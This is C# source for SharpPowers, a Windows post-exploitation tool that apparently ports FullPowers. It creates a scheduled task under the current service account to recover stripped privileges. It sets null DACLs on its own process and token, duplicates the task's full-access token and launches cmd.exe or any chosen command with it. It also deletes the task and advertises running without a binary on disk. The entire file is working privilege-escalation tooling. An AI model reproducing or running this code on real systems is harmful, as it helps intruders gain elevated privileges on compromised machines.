using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;
using System.Collections;
using System.Runtime.CompilerServices;
using System.Runtime.Versioning;
using System.Security;
using System.Security.Principal;
using System.Diagnostics.Contracts;
using System.Security.AccessControl;
using System.Reflection;
namespace SharpPowers
{
    internal class Program
    {
        [Flags]
        public enum CreateProcessFlags
        {
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }
        static uint ERROR_SUCCESS = 0;
  
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public String lpReserved;
            public String lpDesktop;
            public String lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 dwProcessId;
            public Int32 dwThreadId;
        }
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }
        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }
        public enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }
        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const UInt32 TOKEN_DUPLICATE = 0x0002;
        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern Boolean CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
        
        [DllImport("advapi32.dll", EntryPoint = "SetSecurityInfo", CallingConvention = CallingConvention.Winapi, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Unicode)]
        internal static extern uint SetSecurityInfo(IntPtr handle, ResourceType objectType, SecurityInfos securityInformation, SecurityIdentifier owner, SecurityIdentifier group, GenericAcl dacl, GenericAcl sacl);

        [DllImport("kernel32.dll", SetLastError = true)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess,bool bInheritHandle,uint processId);
        
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {

            String fileName = Environment.GetEnvironmentVariable("ComSpec");
            String command = "";
            bool interactive = false;
            bool tokenMode = false;
            bool extPrivileges = false;
            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-t":
                        tokenMode = true;
                        break;
                    case "-f":
                        if (i + 1 == args.Length)
                        {
                            Console.WriteLine("[-] Missing Filename of executeable \n Exiting");
                        }
                        i++;
                        fileName = args[i];
                        break;
                    case "-c":
                        if (i + 1 == args.Length)
                        {
                            Console.WriteLine("[-] Missing Command to run (Arguments to pass to executeable) \n Exiting");
                        }
                        i++;
                        command = args[i];
                        break;
                    case "-i":
                        interactive = true;
                        break;
                    case "-x":
                        extPrivileges = true;
                        break;

                    case "-h":
                        printHelp();
                        return;
                    default:
                        Console.WriteLine("[-] Unknown argument '" + args[i] + "' \n Exiting");
                        return;
                }
            }
            if (tokenMode)
            {
                enableTaskProcessAccess();
            }
            else
            {
                doMain(fileName, command, interactive, extPrivileges);

            }

        }
        static void printHelp()
        {
            Console.WriteLine("SharpPowers.exe: C# Implementation of @it4mn's FullPowers (https://github.com/itm4n/FullPowers), allowing to run non-interactive commands without needing binary on disk");
            Console.WriteLine("\t\tCreator: @ret2desync");
            Console.WriteLine("\t\tOriginal Creator: @it4mn");

            Console.WriteLine("Arguments");
            Console.WriteLine("\t -c <Command>: Command/arguments to pass to the executeable");
            Console.WriteLine("\t -f <File_To_Execute>: Specifies which executeable file to run (default is cmd.exe)");
            Console.WriteLine("\t -h : Show help menu.");
            Console.WriteLine("\t -i : Interact with the new process (Default is to run without interaction) - Note: This requires that the this binary is on disk (i.e. not run in memory)");
            Console.WriteLine("\t -x : Attempt to obtain the extended set of privileges");


        }
        static bool doMain(String fileName, String command, bool interactive, bool extPrivileges)
        {
            String taskName = "SharpPowers_" + Guid.NewGuid();
            uint processId;
            if (interactive) {
                Console.WriteLine("[**] Will attempt to run: " + fileName + " " + command + "as current user requesting privileges back and allow interaction");
                string execPath = Assembly.GetEntryAssembly().Location;
                processId = createAndRunScheduledTask(taskName, execPath, "-t", extPrivileges);
                if (processId == 0)
                {
                    Console.Error.WriteLine("[-] Failed to create scheduled task");
                    return false;
                }
                Console.WriteLine("[+] New scheduled task created PID: " + processId);
                Sleep(2000);
                IntPtr hProcessHandle = OpenProcess(ProcessAccessFlags.All, true, processId);
                if (hProcessHandle == IntPtr.Zero)
                {
                    Console.Error.WriteLine("[-] Failed to call OpenProcess, Error: " + Marshal.GetLastWin32Error());
                    return false;
                }
                IntPtr hTaskToken = IntPtr.Zero;
                if (!OpenProcessToken(hProcessHandle, TOKEN_ALL_ACCESS, out hTaskToken)){
                    Console.Error.WriteLine("[-] Failed to call OpenProcessToken, Error: " + Marshal.GetLastWin32Error());
                    return false;
                }
                
                IntPtr hTaskDupToken = IntPtr.Zero;
                if (!DuplicateTokenEx(hTaskToken, TOKEN_ALL_ACCESS,IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,TOKEN_TYPE.TokenImpersonation, out hTaskDupToken))
                {
                    Console.Error.WriteLine("[-] Failed to call DuplicateTokenEx, Error: " + Marshal.GetLastWin32Error());
                    return false;
                }
                TerminateProcess(hProcessHandle, 0);
                Scheduler.DeleteScheduledTask(taskName);
                PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
                STARTUPINFO startUpInfo = new STARTUPINFO();

                if (!CreateProcessAsUser(hTaskDupToken, null, fileName + " " + command, IntPtr.Zero, IntPtr.Zero, true, CreateProcessFlags.CREATE_UNICODE_ENVIRONMENT, IntPtr.Zero, System.IO.Directory.GetCurrentDirectory(), ref startUpInfo, out processInformation))
                {
                    Console.Error.WriteLine("[-] Failed to call CreateProcessAsUser, Error: " + Marshal.GetLastWin32Error());
                    return false;
                }
                else
                {
                    Console.WriteLine("[+] Successfully called CreateProcessAsUser!");
                }
                WaitForSingleObject(processInformation.hProcess, UInt32.MaxValue);
            }
            else
            {
                Console.WriteLine("[**] Will attempt to run: " + fileName + " " + command + " as current user requesting privileges back without interacting with the new process");
                processId = createAndRunScheduledTask(taskName, fileName, command, extPrivileges);
                if (processId == 0)
                {
                    Console.Error.WriteLine("[-] Failed to create scheduled task");
                    return false;
                }
                Console.WriteLine("[+] New scheduled task created PID: " + processId);
                Scheduler.DeleteScheduledTask(taskName);
            }


            return true;
        }

        static bool enableTaskProcessAccess()
        {
            IntPtr hProcessToken = IntPtr.Zero;
            if (!(SetSecurityInfo(GetCurrentProcess(), ResourceType.KernelObject, SecurityInfos.DiscretionaryAcl, null, null, null, null) == ERROR_SUCCESS))
            {
                Console.Error.WriteLine("[-] Failed call to SetSecurityInfo, Error: " + Marshal.GetLastWin32Error());
                return false;
            }
            if (!(OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, out hProcessToken)))
            {
                Console.Error.WriteLine("[-] Failed call to OpenProcessToken, Error: " + Marshal.GetLastWin32Error());
                return false;
            }
            if (!(SetSecurityInfo(hProcessToken, ResourceType.KernelObject, SecurityInfos.DiscretionaryAcl, null, null, null, null) == ERROR_SUCCESS))
            {
                Console.Error.WriteLine("[-] Failed call to SetSecurityInfo, Error: " + Marshal.GetLastWin32Error());
                return false;
            }
            Sleep(30000);
            CloseHandle(hProcessToken);
            return true;
        }
        static uint createAndRunScheduledTask(string taskName, String fileName, String command, bool extPrivileges)
        {
            string execPath = Assembly.GetEntryAssembly().Location;
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

            if (!Scheduler.createScheduledTask(taskName, fileName,command, userName, extPrivileges))
            {
                Console.Error.WriteLine("[-] Failed to create scheduled task with name " + taskName + "!");
                return 0;
            }
            if (!Scheduler.startScheduledTask(taskName))
            {
                Console.Error.WriteLine("[-] Failed to start scheduled task with name " + taskName + "!");
                return 0;
            }
            return Scheduler.runningTaskPid;
        }
    }
}
